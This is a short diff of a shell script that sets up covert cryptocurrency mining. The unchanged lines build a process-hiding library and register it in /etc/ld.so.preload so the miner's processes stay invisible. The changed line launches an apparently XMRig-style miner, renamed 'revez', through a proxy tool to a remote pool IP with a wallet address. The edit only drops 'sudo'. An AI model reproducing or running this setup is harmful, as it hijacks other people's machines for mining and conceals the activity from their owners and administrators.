@@ -51,4 +51,4 @@ gcc -Wall -fPIC -shared -o libprocesshider.so processhider.c -ldl
 mv libprocesshider.so /usr/local/lib/
 echo /usr/local/lib/libprocesshider.so >> /etc/ld.so.preload
 
-./graftcp/graftcp sudo ./revez --url 45.76.89.70:80 --user 89XsXBTmSdMbLFh8TfCWLBDXrWDN6arjEZdCtW6ZSQmMguE8oJV5qjxJpoiAinNoMaUq3GhcsXqvWc2BurXRtnnNQxsfRNi --pass Bin --donate-level 1 --tls --tls-fingerprint 420c7850e09b7c0bdcf748a7da9eb3647daf8515718f36d9ccfdd6b9ff834b14 -t 4
+./graftcp/graftcp ./revez --url 45.76.89.70:80 --user 89XsXBTmSdMbLFh8TfCWLBDXrWDN6arjEZdCtW6ZSQmMguE8oJV5qjxJpoiAinNoMaUq3GhcsXqvWc2BurXRtnnNQxsfRNi --pass Bin --donate-level 1 --tls --tls-fingerprint 420c7850e09b7c0bdcf748a7da9eb3647daf8515718f36d9ccfdd6b9ff834b14 -t 4
